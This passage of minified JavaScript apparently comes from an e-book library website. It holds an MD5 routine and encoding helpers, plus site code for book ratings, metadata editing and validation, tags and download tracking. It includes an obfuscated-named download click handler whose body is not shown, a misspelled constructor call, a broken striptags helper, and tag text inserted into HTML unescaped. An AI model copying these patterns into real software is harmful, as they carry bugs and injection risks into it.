y=c,b=u,w=d,k=h;c=p(c,u,d,h,a[f+0],7,-680876936),h=p(h,c,u,d,a[f+1],12,-389564586),d=p(d,h,c,u,a[f+2],17,606105819),u=p(u,d,h,c,a[f+3],22,-1044525330),c=p(c,u,d,h,a[f+4],7,-176418897),h=p(h,c,u,d,a[f+5],12,1200080426),d=p(d,h,c,u,a[f+6],17,-1473231341),u=p(u,d,h,c,a[f+7],22,-45705983),c=p(c,u,d,h,a[f+8],7,1770035416),h=p(h,c,u,d,a[f+9],12,-1958414417),d=p(d,h,c,u,a[f+10],17,-42063),u=p(u,d,h,c,a[f+11],22,-1990404162),c=p(c,u,d,h,a[f+12],7,1804603682),h=p(h,c,u,d,a[f+13],12,-40341101),d=p(d,h,c,u,a[f+14],17,-1502002290),c=g(c,u=p(u,d,h,c,a[f+15],22,1236535329),d,h,a[f+1],5,-165796510),h=g(h,c,u,d,a[f+6],9,-1069501632),d=g(d,h,c,u,a[f+11],14,643717713),u=g(u,d,h,c,a[f+0],20,-373897302),c=g(c,u,d,h,a[f+5],5,-701558691),h=g(h,c,u,d,a[f+10],9,38016083),d=g(d,h,c,u,a[f+15],14,-660478335),u=g(u,d,h,c,a[f+4],20,-405537848),c=g(c,u,d,h,a[f+9],5,568446438),h=g(h,c,u,d,a[f+14],9,-1019803690),d=g(d,h,c,u,a[f+3],14,-187363961),u=g(u,d,h,c,a[f+8],20,1163531501),c=g(c,u,d,h,a[f+13],5,-1444681467),h=g(h,c,u,d,a[f+2],9,-51403784),d=g(d,h,c,u,a[f+7],14,1735328473),c=m(c,u=g(u,d,h,c,a[f+12],20,-1926607734),d,h,a[f+5],4,-378558),h=m(h,c,u,d,a[f+8],11,-2022574463),d=m(d,h,c,u,a[f+11],16,1839030562),u=m(u,d,h,c,a[f+14],23,-35309556),c=m(c,u,d,h,a[f+1],4,-1530992060),h=m(h,c,u,d,a[f+4],11,1272893353),d=m(d,h,c,u,a[f+7],16,-155497632),u=m(u,d,h,c,a[f+10],23,-1094730640),c=m(c,u,d,h,a[f+13],4,681279174),h=m(h,c,u,d,a[f+0],11,-358537222),d=m(d,h,c,u,a[f+3],16,-722521979),u=m(u,d,h,c,a[f+6],23,76029189),c=m(c,u,d,h,a[f+9],4,-640364487),h=m(h,c,u,d,a[f+12],11,-421815835),d=m(d,h,c,u,a[f+15],16,530742520),c=v(c,u=m(u,d,h,c,a[f+2],23,-995338651),d,h,a[f+0],6,-198630844),h=v(h,c,u,d,a[f+7],10,1126891415),d=v(d,h,c,u,a[f+14],15,-1416354905),u=v(u,d,h,c,a[f+5],21,-57434055),c=v(c,u,d,h,a[f+12],6,1700485571),h=v(h,c,u,d,a[f+3],10,-1894986606),d=v(d,h,c,u,a[f+10],15,-1051523),u=v(u,d,h,c,a[f+1],21,-2054922799),c=v(c,u,d,h,a[f+8],6,1873313359),h=v(h,c,u,d,a[f+15],10,-30611744),d=v(d,h,c,u,a[f+6],15,-1560198380),u=v(u,d,h,c,a[f+13],21,1309151649),c=v(c,u,d,h,a[f+4],6,-145523070),h=v(h,c,u,d,a[f+11],10,-1120210379),d=v(d,h,c,u,a[f+2],15,718787259),u=v(u,d,h,c,a[f+9],21,-343485551),c=c+y>>>0,u=u+b>>>0,d=d+w>>>0,h=h+k>>>0}return e.endian([c,u,d,h])};s._ff=function(t,e,n,i,r,o,s){var a=t+(e&n|~e&i)+(r>>>0)+s;return(a<<o|a>>>32-o)+e},s._gg=function(t,e,n,i,r,o,s){var a=t+(e&i|n&~i)+(r>>>0)+s;return(a<<o|a>>>32-o)+e},s._hh=function(t,e,n,i,r,o,s){var a=t+(e^n^i)+(r>>>0)+s;return(a<<o|a>>>32-o)+e},s._ii=function(t,e,n,i,r,o,s){var a=t+(n^(e|~i))+(r>>>0)+s;return(a<<o|a>>>32-o)+e},s._blocksize=16,s._digestsize=16,t.exports=function(t,n){if(null==t)throw new Error("Illegal argument "+t);var i=e.wordsToBytes(s(t,n));return n&&n.asBytes?i:n&&n.asString?o.bytesToString(i):e.bytesToHex(i)}}()},function(t,e){!function(){var e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",n={rotl:function(t,e){return t<<e|t>>>32-e},rotr:function(t,e){return t<<32-e|t>>>e},endian:function(t){if(t.constructor==Number)return 16711935&n.rotl(t,8)|4278255360&n.rotl(t,24);for(var e=0;e<t.length;e++)t[e]=n.endian(t[e]);return t},randomBytes:function(t){for(var e=[];t>0;t--)e.push(Math.floor(256*Math.random()));return e},bytesToWords:function(t){for(var e=[],n=0,i=0;n<t.length;n++,i+=8)e[i>>>5]|=t[n]<<24-i%32;return e},wordsToBytes:function(t){for(var e=[],n=0;n<32*t.length;n+=8)e.push(t[n>>>5]>>>24-n%32&255);return e},bytesToHex:function(t){for(var e=[],n=0;n<t.length;n++)e.push((t[n]>>>4).toString(16)),e.push((15&t[n]).toString(16));return e.join("")},hexToBytes:function(t){for(var e=[],n=0;n<t.length;n+=2)e.push(parseInt(t.substr(n,2),16));return e},bytesToBase64:function(t){for(var n=[],i=0;i<t.length;i+=3)for(var r=t[i]<<16|t[i+1]<<8|t[i+2],o=0;o<4;o++)8*i+6*o<=8*t.length?n.push(e.charAt(r>>>6*(3-o)&63)):n.push("=");return n.join("")},base64ToBytes:function(t){t=t.replace(/[^A-Z0-9+\/]/gi,"");for(var n=[],i=0,r=0;i<t.length;r=++i%4)0!=r&&n.push((e.indexOf(t.charAt(i-1))&Math.pow(2,-2*r+8)-1)<<2*r|e.indexOf(t.charAt(i))>>>6-2*r);return n}};t.exports=n}()},function(t,e){function n(t){return!!t.constructor&&"function"==typeof t.constructor.isBuffer&&t.constructor.isBuffer(t)}t.exports=function(t){return null!=t&&(n(t)||function(t){return"function"==typeof t.readFloatLE&&"function"==typeof t.slice&&n(t.slice(0,0))}(t)||!!t._isBuffer)}},function(t,e,n){t.exports=n(1)}]);Handlebars.registerHelper("cutText",(function(t,e){if(!t)return;let n=(t=t.replace(/<[\/\w]+>/g,"")).substr(0,e);if(t.length>n.length){n=t.substr(0,e);let i=Math.min(n.length,n.lastIndexOf(" "));-1==i&&(i=e),n=n.substr(0,i)+"..."}return n})),Handlebars.registerHelper("striptags",(function(t){if(!t)return t.replace(/<[\/\w]+>/g,"")}));const BookComment=function(t){this.id=t,this.deleteComment=function(){if(!confirm("Delete comment?"))return;const t=new Request("/papi/admin/comment/"+this.id,{method:"DELETE"});return new StorybookResponse(t).success((t=>$("#comment-"+this.id).fadeOut().promise().then((t=>t.remove())))).fetch()}},BookTemporary=function(t){t&&(this.id=t.id,this.data=t),this.uploadCover=(t,e)=>{if(!t)return;const n=new FormData;n.append("cover",t);const i=new StorybookSpinner("iconCoverUpload"),r=new Request("/papi/book-temporary/"+this.id+"/cover",{method:"POST",body:n});return new StorybookResponse(r).spinner(i).success(e).fetch()},this.save=(t,e)=>{const n=new StorybookSpinner("btnSubmitBook"),i=new Request("/papi/book-temporary/"+this.id,{method:"PUT",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:t});return new StorybookResponse(i).spinner(n).success(e).fetch()},this.setFromMeta=t=>{const e=new Request("/papi/book-temporary/"+this.id+"/set-from-meta");return new StorybookResponse(e).success(t).fetch()},this.confirm=(t,e)=>{const n=new StorybookSpinner("iconConfirm_"+this.id).color("#8ecd51"),i=new Request("/papi/book-temporary/"+this.id+"/confirm");return new StorybookResponse(i).spinner(n).success(t).error(e).fetch()},this.delete=(t,e)=>{const n=new Request("/papi/book-temporary/"+this.id,{method:"DELETE"});return new StorybookResponse(n).success(t).error(e).fetch()},this.showModal=()=>{this.modal=new StorybookModal({url:"/layer/_modals/book_temporary_edit_dialog?id="+this.id,title:"Edit book",width:"100%",top:"-15px",styles:{"max-width":"1100px"}}).show()},this.hideModal=()=>{$("#Storybook-modal").modal("hide")}},BookRating=function(t){"object"==typeof t&&t.id&&(this.userId=t.id),this.downloadedBooks=window.localStorage?localStorage.getItem("downloadedBooks"):null,this.userScoresLoaded=!1,this.userScoreLoaded={},this.ratedBookIdList=!1,this.ratedBookTermsHashList=!1,this.loadRatedBooksIsCalled=!1,this.tooltipEl=null,this.initChoiceContainerEvents=()=>{$(document).on("mouseover",".book-rating-star",(function(){$(this).closest(".stars-list").data("disabled")||($(this).addClass("active-choice"),$(this).prevAll(".book-rating-star").addClass("active-choice"),$(this).nextAll(".book-rating-star").removeClass("active-choice"),$(this).closest(".stars-list").find(".active").removeClass("active").addClass("active-none"))})),$(document).on("mouseleave",".book-choice-rating .stars-list",(function(){$(this).data("disabled")||($(this).find(".book-rating-star").removeClass("active-choice"),$(this).find(".active-none").removeClass("active-none").addClass("active"))})),$(document).on("mouseenter",".book-choice-rating",(function(){$(this).data("visible",1)})),$(document).on("mouseleave",".book-choice-rating",(function(){const t=$(this);t.data("visible",0),setTimeout((function(){t.data("visible")||t.hide()}),300)})),$(document).on("mouseleave",".book-rating-detail .book-rating, .book-rating-dstats .book-rating",(function(){let t=$(this).parent().find(".book-choice-rating");t.length||(t=$(".book-choice-rating")),t.data("visible",0),setTimeout((function(){t.data("visible")||t.hide()}),300)}))},this.initTooltip=t=>{navigator.maxTouchPoints||(this.tooltipEl=t,$bookRatingTooltip=$('<div class="book-rating-tooltip" style="display: none"></div>'),$("body").append($bookRatingTooltip),t.tooltip({container:$bookRatingTooltip,placement:"bottom",html:!0,title:i18next.t("Book Rating / File Quality")}),t.on("shown.bs.tooltip",(function(){const e=$bookRatingTooltip.find(".tooltip");$("body").append(e),e.css({"white-space":"nowrap",top:$(this).offset().top+20+"px",left:t.find(".book-rating-quality-score").offset().left-e.width()/2-6+"px"})})))},this.clearUserScoreLoadedCache=()=>{this.userScoreLoaded={}},this.postScore=(t,e,n)=>{const i=this,r=new StorybookSpinner(e).color("#777");new StorybookResponse("/papi/book-rating/score",t).spinner(r).success((function(e){i.addBookToRatedBooks(t.bookId,e.termsHash),n(e)})).error(n).fetch()},this.fixChoiceWindowPositionInBookDetails=()=>{const t=$(".book-choice-rating"),e=$(".book-rating-detail .book-rating .book-rating-quality-score"),n=parseInt(e.offset().left),i=parseInt(t.width()),r=parseInt(e.offset().top)+30,o=n>100?n-(parseInt(i/2)+4):0;t.css({top:r+"px",left:o+"px"})},this.addBookToRatedBooks=(t,e)=>{if(!window.localStorage||isNaN(t=parseInt(t)))return;const n=JSON.parse(localStorage.getItem("ratedBookIdList"))||[];if(-1===$.inArray(t,n)&&(n.push(t),this.ratedBookIdList=n,localStorage.setItem("ratedBookIdList",JSON.stringify(n))),"string"!=typeof e||!e.length)return;const i=JSON.parse(localStorage.getItem("ratedBookTermsHashList"))||[];-1===$.inArray(e,i)&&(i.push(e),this.ratedBookTermsHashList=i,localStorage.setItem("ratedBookTermsHashList",JSON.stringify(i)))},this.checkExistsScoreForBook=(t,e,n)=>{window.localStorage&&!isNaN(t=parseInt(t))?(localStorage.getItem("bookRatingUser")!=this.userId&&this.clearRatedBooks(),this.ratedBookIdList||(this.ratedBookIdList=JSON.parse(localStorage.getItem("ratedBookIdList")),this.ratedBookTermsHashList=JSON.parse(localStorage.getItem("ratedBookTermsHashList")),null!==this.ratedBookIdList)?n(-1!==$.inArray(t,this.ratedBookIdList)||e&&-1!==$.inArray(e,this.ratedBookTermsHashList)):this.loadRatedBooks((function(i,r){n(-1!==$.inArray(t,i)||e&&-1!==$.inArray(e,r))}))):n(!1)},this.loadRatedBooks=t=>{window.localStorage&&this.userId&&!this.loadRatedBooksIsCalled&&(this.loadRatedBooksIsCalled=!0,new StorybookResponse("/papi/book-rating/user-rated-books").success((e=>{if(localStorage.setItem("bookRatingUser",this.userId),e.idList&&localStorage.setItem("ratedBookIdList",JSON.stringify(e.idList)),"object"==typeof e.termsHashList){let t=[];for(i in e.termsHashList)t.push(e.termsHashList[i]),localStorage.setItem("ratedBookTermsHashList",JSON.stringify(t))}"function"==typeof t&&t(e.idList||[],e.termsHashList||[])})).fetch())},this.clearRatedBooks=()=>{window.localStorage&&(this.ratedBookIdList=!1,localStorage.removeItem("ratedBookIdList"),this.ratedBookTermsHashList=!1,localStorage.removeItem("ratedBookTermsHashList"))},this.loadUserScores=t=>{const e=this,n=$(".book-choice-rating"),i=$(".book-choice-quality-stub"),r=n.find(".overlay");if(n.data("visible"))return void n.data("visible",0).hide();n.data("init")||($("body").append(n),n.data("init","1")),this.fixChoiceWindowPositionInBookDetails(),n.data("visible",1);let o=!0;if(window.localStorage&&e.downloadedBooks!==localStorage.getItem("downloadedBooks")&&(o=!1),e.userScoresLoaded&&o)return void n.show();n.show(),r.show();const s=new StorybookSpinner("bookChoiceRatingSpinner").color("#777").length(6).width(3).radius(7);new StorybookResponse("/papi/book-rating/"+t+"/user-scores").spinner(s).success((t=>{e.userScoresLoaded=!0,e.downloadedBooks=window.localStorage?localStorage.getItem("downloadedBooks"):null,n.children(".book-format-quality-rating").remove(),t.data.interest.score&&$(".book-choice-interest-stars").data("score",t.data.interest.score).find(".book-rating-star").slice(0,t.data.interest.score).addClass("active");const o=$(".book-choice-rating > .book-choice-quality-title");if(t.data.quality.length){o.show(),i.hide();let e=0;for(e in t.data.quality){let n=$(".book-quality-rating-template").clone(),i=t.data.quality[e];n.find(".book-choice-quality-stars").attr("data-id",i.bookId),n.find(".format-info .download-date").text(i.downloadedDateDiff),n.find(".format-info .extension").text(i.extension),n.find(".format-info .size").text(i.filesizeString),i.score&&n.find(".book-choice-quality-stars").attr("data-score",i.score).find(".book-rating-star").slice(0,i.score).addClass("active"),o.after(n.html())}}else i.show(),o.hide();r.hide()})).error((t=>{n.hide(),r.hide()})).fetch()},this.loadUserScore=t=>{const e=this,n=$(".dstats-row[data-item_id="+t+"]").find(".book-choice-rating"),i=n.find(".overlay");if(n.data("visible"))return void n.data("visible",0).hide();if(e.userScoreLoaded[t])return void n.data("visible",1).show();const r=$(window).width()-n.parent().offset().left>140?-142:-57;n.data("visible",1).css({top:"30px",right:r+"px"}),n.show(),i.show();const o=new StorybookSpinner("bookChoiceRatingSpinner"+t).color("#777").length(6).width(3).radius(7);new StorybookResponse("/papi/book-rating/"+t+"/user-score").spinner(o).success((r=>{e.userScoreLoaded[t]=!0,i.hide(),r.data.interest&&n.find(".book-choice-interest-stars").data("score",r.data.interest).find(".book-rating-star").removeClass("active").slice(0,r.data.interest).addClass("active"),r.data.quality&&n.find(".book-choice-quality-stars").data("score",r.data.quality).find(".book-rating-star").slice(0,r.data.quality).addClass("active")})).error((t=>{(new StorybookResponse).errorCallback(t),i.hide(),n.hide()})).fetch()}},Book=function(t){t&&(this.id=t.id,this.data=t,void 0!==t.fieldLimits&&(this.fieldLimits={...this.fieldLimits,...t.fieldLimits})),this.uploadCover=(t,e)=>{if(!t)return;const n=new FormData;n.append("cover",t);const i=new StorybookSpinner("iconCoverUpload"),r=new Request("/papi/book/"+this.id+"/cover",{method:"POST",body:n});return new StorybookResponse(r).spinner(i).success((t=>{$("#formBookCover").attr("src",t.book.cover+"?"+(new Date).getTime())})).fetch()},this.delete=()=>{if(!confirm("Delete book?"))return;const t=new Request("/papi/admin/book/"+this.id,{method:"DELETE"}),e=new StorybookSpinner("btnDeleteBook");return new StorybookResponse(t).spinner(e).success((t=>window.location.reload())).fetch()},this.deleteCover=()=>{if(!confirm("Delete cover?"))return;const t=new StorybookSpinner("btnCoverRemove","button"),e=new Request("/papi/admin/book/"+this.id+"/cover",{method:"DELETE"});return new StorybookResponse(e).spinner(t).success((t=>$("#formBookCover").attr("src",t.cover+"?"+(new Date).getTime()))).fetch()},this.suggestCover=t=>{if(!t)return;const e=new FormData;e.append("cover",t);const n=new StorybookSpinner("iconCoverUpload"),i=new Request("/papi/user/book/"+this.id+"/suggestion-cover",{method:"POST",body:e});return new StorybookResponse(i).spinner(n).success((t=>$("#formBookCover").attr("src",t.cover+"?"+(new Date).getTime()))).fetch()},this.suggestCorrection=t=>{const e=new StorybookSpinner("btnSubmitSuggestion"),n=new Request("/papi/user/book/"+this.id+"/suggestion",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)});return new StorybookResponse(n).spinner(e).success((t=>{StorybookNotify().info(t.approved?i18next.t("Thank you for the correction!<br/>Please reload the page to see the updated info.<br/>(The book cover will be updated later)"):i18next.t("Thank you for the suggestion!<br>After moderation it will appear on the site")),this.bookDetailsModalHide()})).fetch()},this.submitIssue=t=>{const e=new StorybookSpinner("btnSubmitIssue"),n=new Request("/papi/book-issues/"+this.id,{method:"PUT",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:t});return new StorybookResponse(n).spinner(e).success((t=>{StorybookNotify().info(i18next.t("Thank you for reporting a problem!<br>We will check this book soon")),this.bookDetailsModalHide()})).fetch()},this.suggestModal=()=>{new StorybookModal({url:"/layer/_modals/suggest_correction_dialog?id="+this.id,title:i18next.t("Suggest corrections"),width:document.querySelector(".super-puper-main-container").clientWidth>1100?1100:"auto"}).show()},this.reportModal=()=>{new StorybookModal({url:"/layer/_modals/report_problem_dialog?id="+this.id,title:i18next.t("Report a problem"),width:600}).show()},this.bookDetailsModalHide=()=>{(new StorybookModal).hide()},this.checkOtherFormats=()=>{const t=new StorybookSpinner("bookOtherFormatsSpinnerContainer","button"),e=new Request("/papi/book/"+this.id+"/formats");return new StorybookResponse(e).disableNotify().spinner(t).success((t=>{if(!t.books||!t.books.length)return $("#bookOtherFormatsContainer").html('<span class="dropdown-menu-muted">No other formats found</span>'),void(0==$("#btnCheckOtherFormats").data("convertation-available")&&($("#btnCheckOtherFormats").next(".dropdown-menu").remove(),$("#btnCheckOtherFormats").remove()));let e="";$.each(t.books,(function(t,n){let i=n.isLowQuality?'<i class="low-quality-icon" data-placement="bottom" title="'+i18next.t("Users reported that this is a bad file")+'"></i>':"";e+='<li><a href="'+n.href+'" onclick="return _0x371adf(this)" data-book_id="'+n.id+'" class="addDownloadedBook"><b class="book-property__extension">'+n.extension+"</b>"+i+' <span class="pull-right">'+n.filesizeString+"</span></a></li>"})),$("#btnCheckOtherFormats").removeClass("hidden"),$("#bookOtherFormatsContainer").replaceWith(e),$(".low-quality-icon").tooltip()})).fetch()},this.initValidate=function(t){return t&&(this.formID=t),this},this.validate=function(t,e){this.$form=void 0!==t?$("#"+t):$("#"+this.formID),isValid={title:t=>this.validateTitle(t),author:t=>this.validateAuthor(t),publisher:t=>this.validatePublisher(t),series:t=>this.validateSeries(t),volume:t=>this.validateVolume(t),edition:t=>this.validateEdition(t),year:t=>this.validateYear(t),pages:t=>this.validatePages(t),isbn:t=>this.validateISBN(t)};try{if(void 0!==e)for(const t in e){const n=e[t];"function"==typeof isValid[t]&&isValid[t](n)}else for(const t in isValid)isValid[t]()}catch(t){return StorybookNotify().error(t),!1}return!0}};Book.prototype.ISBNcleanPattern=/[\s _\-\—\.]/g,Book.prototype.identifierValidPattern=/^[a-z0-9 _\-\—]{6,16}$/i,Book.prototype.formID="formBookEdit",Book.prototype.fieldLimits={title:{max:255},author:{max:255},publisher:{max:100},series:{max:300},volume:{max:100},edition:{max:60},pages:{min:1,max:65535},year:{min:1800,max:(new Date).getFullYear()+1},isbn:{max:120}},Book.prototype.validateTitle=function(t){let e=void 0!==t?t:$('input[name="title"]',this.$form).val().trim();if(!e)throw i18next.t("Required parameters are missing.")+" "+i18next.t("Fill in the fields marked with an *.");if(this.fieldLimits.title.max<e.length)throw i18next.t("Wrong book info ({{field}}).",{field:"Title"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.title.max})},Book.prototype.validateAuthor=function(t){let e=void 0!==t?t:$('input[name="author"]',this.$form).val().trim();if(!e)throw i18next.t("Required parameters are missing.")+" "+i18next.t("Fill in the fields marked with an *.");if(this.fieldLimits.author.max<e.length)throw i18next.t("Wrong book info ({{field}}).",{field:"Author"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.author.max})},Book.prototype.validatePublisher=function(t){let e=void 0!==t?t:$('input[name="publisher"]',this.$form).val().trim();if(this.fieldLimits.publisher.max<e.length)throw i18next.t("Wrong book info ({{field}}).",{field:"Publisher"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.publisher.max})},Book.prototype.validateSeries=function(t){let e=void 0!==t?t:$('input[name="series"]',this.$form).val().trim();if(this.fieldLimits.series.max<e.length)throw i18next.t("Wrong book info ({{field}}).",{field:"Series name"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.series.max})},Book.prototype.validateVolume=function(t){if((void 0!==t?t:$('input[name="volume"]',this.$form).val().trim()).length>this.fieldLimits.volume.max)throw i18next.t("Wrong book info ({{field}}).",{field:"Volume"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.volume.max})},Book.prototype.validateEdition=function(t){if((void 0!==t?t:$('input[name="edition"]',this.$form).val().trim()).length>this.fieldLimits.edition.max)throw i18next.t("Wrong book info ({{field}}).",{field:"Edition"})+" "+i18next.t("Reduce the number of characters to {{number}}!",{number:this.fieldLimits.edition.max})},Book.prototype.validatePages=function(t){let e=void 0!==t?t:$('input[name="pages"]',this.$form).val();if(e.length&&(!this.isInteger(e)||Number.parseInt(e)>this.fieldLimits.pages.max||Number.parseInt(e)<this.fieldLimits.pages.min))throw i18next.t("Wrong book info ({{field}}).",{field:"Pages"})+" "+i18next.t("Only positive integers!")},Book.prototype.validateYear=function(t){let e=void 0!==t?t:$('input[name="year"]',this.$form).val();if(e.length&&(!this.isInteger(e)||Number.parseInt(e)<this.fieldLimits.year.min||Number.parseInt(e)>this.fieldLimits.year.max))throw i18next.t("Wrong book info ({{field}}).",{field:"Year"})+" "+i18next.t("Enter the year in the range {{from}}-{{to}}.",{from:this.fieldLimits.year.min,to:this.fieldLimits.year.max})+" "+i18next.t("Only positive integers!")},Book.prototype.validateISBN=function(){const t=$('input[name="isbn[]"]',this.$form);let e=0,n=!1,i=[/([a-z])\1{5,}/i,/^[^\d]+$/];if(t.each(((t,r)=>{if(""==$(r).val().trim())return;let o=$(r).val().trim().replace(this.ISBNcleanPattern,"");for(let t=0;t<i.length;t++)if(!0===i[t].test(o)){$(r).attr("style","border: 1px solid red; margin-left: -1px;"),setTimeout((()=>$(r).removeAttr("style")),5e3),n=!0;break}!1===this.identifierValidPattern.test(o)&&($(r).attr("style","border: 1px solid red; margin-left: -1px;"),setTimeout((()=>$(r).removeAttr("style")),5e3),n=!0),e+=$(r).val().length})),n)throw i18next.t("Invalid identifier(s). It must contain only Latin letters, numbers, spaces, and hyphens");if(this.fieldLimits.isbn.max<e)throw i18next.t("Wrong book info ({{field}}).",{field:"isbn"})+" "+i18next.t("Reduce the number of isbn!")},Book.prototype.isInteger=function(t){return RegExp(/^[1-9]\d*$/).test(t)};const TagsInput=function(t,e,n,i){const r=this;this.user=e,this.bookId=n,this.$el=t,this.beforeItemAdd=function(t,e){r.cancelDestroy=!0;const n=$("#btnSaveBook"),i=$("#btnUnsaveBook"),o=!n.hasClass("hidden"),s=new StorybookSpinner(n).color("#666666"),a=t.item.toString(),l=$(t.target).closest(".tags-container-input");if(!isValidInputString(a))return r.$el.tagsinput("remove",a),!1;const c=new Request("/papi/user/book/"+r.bookId+"/tag",{method:"PUT",body:a});o&&(s.start(),n.prop("disabled",!0)),new StorybookResponse(c).success((function(){s.stop(),n.prop("disabled",!1),o&&(n.addClass("hidden"),i.removeClass("hidden")),CurrentUser.addBookTagsInHtml(a)})).error((t=>{s.stop(),n.prop("disabled",!1),StorybookNotify({delay:8e3}).error(t.error?t.error:i18next.t("Something went wrong")),r.$el.tagsinput("remove",a,{preventPost:!0})})).fetch(),setTimeout((function(){l.find(".bootstrap-tagsinput input").val("")}),1)},this.itemAdded=function(t){const e=t.item.toString(),n=$(t.target).closest(".tags-container-input"),i=n.find(".bootstrap-tagsinput .tag:last");if(!isValidInputString(e))return i.remove(),n.find(".bootstrap-tagsinput input").val("").focus(),(new StorybookNotify).error(i18next.t("Invalid tag name")),!1;i.html(e+'<span data-role="remove"></span>')},this.beforeItemRemove=function(t,e){r.cancelDestroy=!0;const n=new Request("/papi/user/book/"+r.bookId+"/tag",{method:"DELETE",body:t.item});new StorybookResponse(n).success((function(){CurrentUser.removeBookTagsInHtml(t.item)})).fetch()},this.clear=function(){r.$el.tagsinput("removeAll")},r.$el.tagsinput({typeahead:{source:i},maxChars:30}),r.$el.on("beforeItemAdd",this.beforeItemAdd),r.$el.on("beforeItemRemove",this.beforeItemRemove),r.$el.on("itemAdded",this.itemAdded),r.$el.closest(".tags-container-input").find(".bootstrap-tagsinput input").trigger("keydown"),$(".bootstrap-tagsinput input").on("input",(function(){const t=$(this).val().length;t>1&&t<=5?$(this).css("width",18*t+"px"):t>5?$(this).css("width",12*t+"px"):$(this).css("width","auto")})),$(".bootstrap-tagsinput input").on("focusout",(function(){const t=$(this),e=r.$el.closest(".tags-container-input").find(".bootstrap-tagsinput input");e.length&&(e.val().length?e.trigger("keypress").trigger("focusout"):(r.cancelDestroy=!1,setTimeout((function(){if(r.cancelDestroy)return!1;const e=t.closest(".bookRow").find(".tags-container"),n=t.closest(".tags-container-input");e.find("span.label-info").remove(),e.prepend(n.find("span.tag")),n.addClass("hidden"),e.removeClass("hidden"),r.$el.off("beforeItemAdd",this.beforeItemAdd),r.$el.off("beforeItemRemove",this.beforeItemRemove),r.$el.off("itemAdded",this.itemAdded),r.$el.tagsinput("destroy"),$("#savedBooksTagList").load(window.location.href+" #savedBooksTagList")}),300)))}))},User=function(t){function e(t){let e={byId:{},byIsbn:{}};return $.each(t,(function(t,n){e.byId[n.id]=n.date,n.isbn&&(e.byIsbn[n.isbn]=n.date)})),e}t&&(this.id=t.id),this.saveReadLater=function(t,e,n="#btnSaveBook",i){new UserBookmarks(this.id).addBookToSavedBooks({bookId:t,spinnerContainer:n,success:e,error:i})},this.deleteReadLater=function(t,e,n="#btnUnsaveBook",i){new UserBookmarks(this.id).deleteBookFromSavedBooks({bookId:t,spinnerContainer:n,success:e,error:i})},this.voteBook=function(t){const e=t.data("book_id"),n=t.data("score"),i=t.parent(),r=new Request("/papi/user/book/"+e+"/vote",{method:"PUT",body:n});return new StorybookReunsponse(r).success((t=>{const e=t.score>=0?"votePositiveValue":"voteNegativeValue",n=t.score>=0?"+"+t.score:t.score;i.find(".btnVote").animate({opacity:0}).promise().then((t=>t.addClass("invinsible"))),i.find(".voteValue").fadeOut().promise().then((t=>t.html(n).addClass(e).css("width","auto"))).then((t=>t.fadeIn()))})).fetch()},this.fetchDownloadedBooks=function(){if(!window.localStorage)return;const t=new Request("/papi/user/get-downloads");return new StorybookResponse(t).disableNotify().fetch().then((t=>{let n=t instanceof Object&&t.downloads instanceof Object&&t.downloads instanceof Array?t.downloads:{};return localStorage.setItem("downloadedBooks",JSON.stringify(n)),localStorage.setItem("downloadedBooksUser",this.id),localStorage.setItem("downloadedBooksUpdated",(new Date).getDate()),e(n)}))},this.getDownloadedBooks=function(){if(!window.localStorage)return;const t=this.getDownloadedBooksFromStorage(),n=localStorage.getItem("downloadedBooksUser"),i=localStorage.getItem("downloadedBooksUpdated");return t&&n==this.id&&i==(new Date).getDate()+1?new Promise((function(n,i){n(e(t))})):this.fetchDownloadedBooks()},this.markDownloadedBooks=function(t){return this.id?this.getDownloadedBooks().then((e=>{$(".checkBookDownloaded:not(.bookDownloaded)").each((function(n,i){const r=parseInt(i.getAttribute("data-book_id")),o=i.getAttribute("data-isbn");if(r in e.byId)dateDownloaded=e.byId[r];else{if(!(o in e.byIsbn))return;dateDownloaded=e.byIsbn[o]}new Date(1e3*dateDownloaded);$(i).addClass("bookDownloaded").append('<span class="mark">'+i18next.t("Downloaded")+"</span>"),"function"==typeof t&&t($(i))}))})):Promise.resolve()},this.addDownloadedBook=function(t){if(!this.id||!window.localStorage)return;const e=this.getDownloadedBooksFromStorage();e&&(e.push({id:t}),localStorage.setItem("downloadedBooks",JSON.stringify(e)),$('.checkBookDownloaded[data-book_id="'+t+'"]').append('<span class="mark">'+i18next.t("Downloaded")+"</span>").addClass("bookDownloaded"))},this.deleteDownloadedBook=function(t){if(!window.localStorage)return;const e=this.getDownloadedBooksFromStorage();$.each(e,(function(n,i){i&&i.id==t&&(e.splice(n,1),localStorage.setItem("downloadedBooks",JSON.stringify(e)),$('.checkBookDownloaded[data-book_id="'+t+'"]').removeClass("bookDownloaded").find(".mark").remove())}))},this.getDownloadedBooksFromStorage=function(){const t=localStorage.getItem("downloadedBooks");let e=null;try{e=t?JSON.parse(t):[]}catch(e){return console.error("Invalid format downloadedBooks. Value: "+t),!1}return $.isArray(e)||(e=[]),e},this.clearDownloadedBooks=function(t){window.localStorage&&(localStorage.removeItem("downloadedBooks"),localStorage.removeItem("downloadedBooksUser"),localStorage.removeItem("downloadedBooksUpdated"))},this.showAuthPopup=function(t,e,n){if("string"!=typeof t||!t.length)return void(new StorybookNotify).error("Undefined action");const i=new StorybookModal({url:"/layer/_modals/auth_modal",width:400,container:"Storybook-modal-auth",afterRender:function(){const r=$("#auth_modal_content"),o=r.find("#auth_modal_"+t);"string"==typeof e&&o.find(".action-msg").text(e),o.show(),r.find(".close-btn").on("click",i.hide),r.find("form").each((function(){new AuthForm(this).useXhr(!0).setModal(i)})),"function"==typeof n&&n()}}).show()},this.isAuth=function(){return!!this.id},this.addBookTagsInHtml=function(t){if("object"!=typeof t)$(".cardBooks .property_user_tags, .cardArticles .property_user_tags").show().find(".property_value").append('<span class="tag label label-info"><a href="/users/saved_books.php?tag='+t+'" style="color:#fff;text-decoration:none;font-size:9pt;" target="_blank">'+t+"</a></span>");else for(i in tags)this.addBookTagsInHtml(tags[i])},this.removeBookTagsInHtml=function(t){$(".property_user_tags .property_value .tag").each((function(){if($(this).text()==t)return 